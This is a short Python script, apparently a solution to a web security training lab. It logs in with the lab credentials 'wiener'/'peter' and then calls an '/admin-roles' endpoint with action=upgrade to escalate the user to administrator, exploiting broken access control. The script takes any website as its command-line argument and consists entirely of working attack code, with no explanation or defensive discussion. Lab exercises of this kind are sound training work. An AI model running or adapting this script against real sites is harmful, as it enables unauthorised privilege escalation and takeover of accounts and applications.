import requests
import sys


def login(url):
    print("(+) Logging in as user Wiener...")
    session = requests.session()
    credentials = {"username": "wiener", "password": "peter"}
    login_page = url + "/login"
    response = session.post(login_page, data=credentials)
    if response.status_code == 200:
        print("(+) Logged in successfully.")
        return session
    else:
        print("(+) Could not login!")
        print("(+) Exiting...")
        exit(1)


def upgrade_user(url, session):
    print("(+) Upgrading user Wiener to admin...")
    upgrade_url = url + "/admin-roles?username=wiener&action=upgrade"
    response = session.get(upgrade_url)
    if response.status_code == 200:
        print("(+) Upgraded user Wiener successfully!")
    else:
        print("(+) Could not upgrade user Wiener.")
        print("(+) Exiting...")
        exit(1)


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python {sys.argv[0]} website")
        print(f"(+) Example: python {sys.argv[0]} www.example.com")
        exit(1)
    
    print("(+) Starting the script...")
    url = sys.argv[1]
    session = login(url)
    upgrade_user(url, session)

if __name__ == "__main__":
    main()